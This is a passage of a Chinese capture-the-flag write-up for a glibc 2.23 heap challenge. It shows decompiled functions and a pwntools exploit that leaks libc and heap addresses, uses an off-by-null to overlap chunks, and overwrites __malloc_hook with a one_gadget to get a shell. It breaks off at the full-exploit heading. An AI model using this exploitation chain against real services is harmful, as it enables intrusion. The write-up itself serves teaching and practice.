
```c
__int64 sub_EB3()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("\x1B[1;33m Which chicken will you cook? \x1B[0m");
  _isoc99_scanf("%d", &v1);
  if ( dword_203060[v1] )
  {
    puts("Old name");
    puts(*(const char **)(qword_203080[v1] + 8LL));
    puts("Give me new name.");
    read(0, *(void **)(qword_203080[v1] + 8LL), *(int *)qword_203080[v1]);
    puts("New name");
    puts(*(const char **)(qword_203080[v1] + 8LL));
    puts("Give me Cook name.");
    sub_BC0(v1);
  }
  else
  {
    puts("\x1B[1;31m Ni gun ma i u. \x1B[0m");
  }
  return 0LL;
}
```

`sub_EB3()`函数用于改名字，并记录菜名。

```c
ssize_t __fastcall sub_BC0(int a1)
{
  return read(0, *(void **)(qword_203080[a1] + 24LL), 0x80uLL);
}
```

`sub_BC0()`函数用于读取菜名。

```c
__int64 sub_1005()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 7; ++i )
  {
    printf("The chicken %d\n", (unsigned int)i);
    if ( dword_203060[i] )
    {
      puts("\x1B[1;33m Name \x1B[0m");
      puts(*(const char **)(qword_203080[i] + 8LL));
      puts("\x1B[1;33m ErrMsg \x1B[0m");
      puts(*(const char **)(qword_203080[i] + 24LL));
      puts("\x1B[1;33m Mark \x1B[0m");
      puts(*(const char **)(qword_203080[i] + 16LL));
    }
  }
  return 0LL;
}
```

`sub_1005()`函数用于打印所有信息。这里菜名被标记为`ErrMsg`。

## 漏洞利用

我们可以通过`sub_BFC()`函数未初始化的`ErrMsg(菜名)`和`sub_1005()`来进行信息泄露，得到`heap`和`libc`地址。然后利用`off-by-null`漏洞制造堆块重叠，向`fastbin`中写入`__malloc_hook`地址，然后篡改其为`one_gadget`来获取权限。

### 前置脚本

```python
from pwn import *

#context.log_level='debug'
context.log_level='info'
context.terminal=['tmux', 'splitw', '-h']
context.arch='amd64'
is_local = False
is_debug = True

def connect():
    global elf, libc, p
    elf = ELF('./562+5Liq5Yiw')
    libc = ELF('./libc-2.23.so')
    if is_local:
        p = process('./562+5Liq5Yiw')
    else:
        p = remote('IP', port)

def debug(gdbscript=""):
    if is_debug:
        gdb.attach(p, gdbscript=gdbscript)
        pause()
    else:
        pass

def Add(size, data, mark):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'1')
    p.recvuntil(b"\x1B[1;33m Give me the size of the chicken. \x1B[0m\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"\x1B[1;33m Give me the name of the chicken. \x1B[0m\n")
    p.send(data)
    p.recvuntil(b"\x1B[1;33m Give the chicken a mark. \x1B[0m\n")
    p.send(mark)

def Delete(idx):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'2')
    p.recvuntil(b"\x1B[1;33m Which chicken will you kill? \x1B[0m\n")
    p.sendline(str(idx).encode())

def Cook(idx, name, cook):
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'3')
    p.recvuntil(b"\x1B[1;33m Which chicken will you cook? \x1B[0m\n")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Give me new name.\n")
    p.send(name)
    p.recvuntil(b"Give me Cook name.\n")
    p.send(cook)

def Black():
    p.recvuntil(b"5.EXIT.\n")
    p.sendline(b'4')
```

定义了函数接口和前置操作。

### 泄露libc地址

```python
def get_libc():
    global __malloc_hook, libc_base
    Add(0x20, b'a'*20, b'b'*20)
    Delete(0)
    Add(0x20, b'c'*20, b'd'*20)
    Black()
    p.recvuntil(b"0\n")
    p.recvuntil(b"\x1B[1;33m ErrMsg \x1B[0m\n")
    libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00'))-0x3c4b78
    log.success("libc : 0x%x" % libc_base)
    __malloc_hook = libc_base + libc.symbols["__malloc_hook"]
```

本题泄露利用`unsorted bin`中保存的`libc`地址与`libc`基址的固定偏移获取`libc`基址。因为结构体在初始化时并未初始化`ErrMsg`的值，并且其大小为`0x90`，我们申请一个结构体再将其释放，再次申请时可将其从`unsorted bin`中申请出来，然后可以通过打印函数打印`unsorted bin`中的内容。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_MN2FFNTEJ4QG7ZP.webp)

在打印前下断点可以看到，此时`ErrMsg`中保存的值为`libc`地址。由于`libc`中的地址固定偏移不受`pie`和`aslr`保护影响，可以由此计算出`libc`基址。

### 泄露heap地址

```python
def get_heap():
    global heap_addr
    Add(0x80, b'e'*0x20, b'f'*0x10) # 1
    Add(0x80, b'g'*0x20, b'h'*0x10) # 2
    Add(0x80, b'i'*0x20, b'j'*0x10) # 3

    Delete(1)
    Delete(3)
    Add(0x20, b'i'*0x20, b'j'*0x10) # 1
    Cook(1, b'a'*0x10, b'cccccccn');
    Black()
    p.recvuntil(b"1\n")
    p.recvuntil(b"\x1B[1;33m ErrMsg \x1B[0m\n")
    p.recvuntil(b'cccccccn')
    heap_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
    log.success("heap : 0x%x" % heap_addr)
```

堆地址也可以通过`unsorted bin`的`bk`指针泄露，我们将两个不连续的`non-fast`大小的堆块放入`unsorted bin`中，由于`unsorted bin`采取先进先出模式，所以我们会将`结构体1`重新申请出来，它`ErrMsg`的`bk`位置便是`结构体3`的地址。然后通过改名函数将`ErrMsg`的前八个字节覆盖满，然后便可通过打印函数将堆地址泄露。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_3R2GUYMRGGEJH42.webp)

同样在打印前下一个断点，可以看到其`bk`位置为一个堆地址。

### 通过修改 `__malloc_hook` 为 `one_gadget` 地址 `get_shell`

```python
def get_shell():
    Add(0x80, b'i'*0x20, b'j'*0x10) # 3
    Add(0x60, p64(0) + p64(0x320) + p64(heap_addr+0x190) + p64(heap_addr+0x190), b'b'*0x10) # 4
    Add(0x60, b'c'*0x10, b'd'*0x10) # 5
    Add(0x60, b'e'*0x10, b'f'*0x10) # 6
    Add(0x60, b'h'*0x10, b'j'*0x10) # 7
    Delete(6)
    Add(0x68, b'k'*0x60 + p64(0x320), b'j'*0x10) # 6
    Delete(6)
    Add(0x2D0, b'a'*0x2A0 + p64(0) + p64(0x71) + p64(__malloc_hook-0x23) + p64(0xdeadbeef), b'b'*0x10) # 6
    Delete(0)
    Delete(1)
    Delete(2)
    Add(0x60, b'a'*0x10, b'b'*0x10) # 0
    one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    Add(0x60, b'a'*0x13+p64(libc_base+one[1]), b'c'*0x10) # 1
    Delete(4)
```

因为`Add`函数存在`off-by-null`漏洞，所以我们可以制造一个堆块重叠，将一个`fast chunk`包含在其中，这里需要注意的时，我们要绕过`unlink`检查，需要将伪造的`fake chunk`的`fd`和`bk`指向它本身。然后计算好偏移将`fast chunk`的`fd`位置改为`__malloc_hook`附近包含`__malloc_hook`大小的`fake chunk`的位置。然后将`__malloc_hook`改为`one_gadget`。此时四个`one_gadget`都无法打通，我们可以`free`一个错误的`chunk`来调用`malloc_printerr`函数，这个函数中存在其他的调用，最后会调用到`malloc`，然后便可调用`one_gadget`。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_J843CHPK3HVPKR4.webp)

通过`find_fake_fast`来寻找`__malloc_hook`附近的`fake_chunk`。`fake_chunk`的`prev_size`距离`__malloc_hook`有0x23大小。所以填充`0x13`字节即可覆盖到目标地址。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_G9JE6M43P2QJSXZ.webp)

我们可以通过`k`来查看函数调用栈，发现`free`报错后会在动态链接器调用`malloc`。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_PE63FPJPWD5CF96.webp)

可以在源码中发现，由于`free`一个错误堆块调用了`malloc_printerr`函数，最后在`dl-error.c`调用了`malloc`函数。

### 完整exp
